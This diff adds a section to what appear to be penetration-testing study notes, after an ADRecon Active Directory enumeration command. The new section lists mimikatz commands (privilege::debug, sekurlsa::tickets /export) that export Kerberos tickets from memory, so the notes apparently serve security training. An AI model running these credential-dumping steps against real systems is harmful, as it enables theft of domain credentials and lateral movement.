@@ -25,3 +25,12 @@ ADRecon
     ./adrecon.ps1 -DomainController 192.168.177.19 –OutputType HTML -Credential lpt.com\cpent
 ![image](https://github.com/user-attachments/assets/63813ab0-0e04-42ef-8f18-86b36605c65a)
 ![image](https://github.com/user-attachments/assets/12ddffa2-2bf4-4b03-871f-b53ef80c8687)
+
+Export Kerberos Tickets
+---
+    使用mimikatz工具
+    mimikatz
+    privilege::debug
+    sekurlsa::tickets /export
+![image](https://github.com/user-attachments/assets/325d960d-dbe1-4dd5-8533-3b9b4fa6ccc9)
+
